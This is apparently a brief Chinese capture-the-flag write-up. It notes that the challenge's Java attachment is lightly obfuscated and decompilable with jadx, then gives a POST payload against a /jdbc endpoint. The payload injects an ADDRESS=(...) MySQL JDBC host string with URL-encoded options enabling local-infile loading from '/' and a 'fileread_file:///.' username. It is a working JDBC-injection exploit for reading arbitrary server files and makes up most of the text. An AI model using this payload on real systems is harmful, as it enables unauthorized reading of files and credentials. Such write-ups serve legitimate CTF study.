给出的附件是有混淆的，但是混淆的并不多，因此可以通过jadx打开或者通过decomplier直接反编译获得正常的源码，混淆的真的不是很严重，但是极具迷惑性，嘿嘿，后面的绕过就是简单的代码审计了，相信各位师傅都会



```
/jdbc

post:
host=ADDRESS=(host=127.0.0.1)(port=3306)(database=test)(user=fileread_file%3A%2F%2F%2F.)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65%49%6e%50%61%74%68=%2F)(%61%6c%6c%6f%77%55%72%6c%49%6e%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%6d%61%78%41%6c%6c%6f%77%65%64%50%61%63%6b%65%74=655360)  #/test&port=3306&database=test&extraParams={}&username=test&password=root


```

